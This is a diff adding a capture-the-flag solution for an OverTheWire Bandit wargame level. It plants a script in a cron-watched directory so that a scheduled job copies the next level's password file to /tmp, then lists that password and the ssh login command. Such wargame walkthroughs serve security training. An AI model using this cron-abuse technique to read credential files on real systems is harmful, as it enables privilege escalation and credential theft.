@@ -1,0 +1,11 @@
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+echo "cat /etc/bandit_pass/bandit24 > /tmp/theotheo1234 &> /tmp/theotheo1234" > /var/spool/bandit24/myfile.file
+chmod 777 /var/spool/bandit24/myfile.file
+touch /tmp/theotheo1234
+chmod 777 /tmp/theotheo1234
+cat /tmp/theotheo1234
+
+flag : UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+ssh bandit24@bandit.labs.overthewire.org -p 2220
